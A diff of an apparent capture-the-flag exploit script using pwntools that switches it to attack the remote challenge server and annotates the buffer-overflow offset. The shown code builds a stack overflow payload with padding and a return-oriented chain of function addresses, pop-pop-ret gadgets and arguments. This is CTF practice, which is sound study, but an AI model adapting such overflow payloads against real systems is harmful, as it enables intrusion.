@@ -2,8 +2,8 @@ from pwn import *
 
 BINARY = ['./chall']
 IP, PORT = 'ctf99.cs.ui.ac.id', 10016
-LOCAL = True
-DEBUG = True
+LOCAL = False
+DEBUG = False
 if LOCAL:
     if DEBUG:
         p = gdb.debug(BINARY, '''
@@ -36,7 +36,7 @@ target_arg5 = p32(0x41414141)
 target_arg6 = p32(0x42424242)
 
 
-dummy = b'A' * (8 + 12)
+dummy = b'A' * (8 + 12) # buffer + eip offset
 payload = dummy
 payload += target + poppopret + target_arg1 + target_arg2
 payload += target + poppopret + target_arg3 + target_arg4
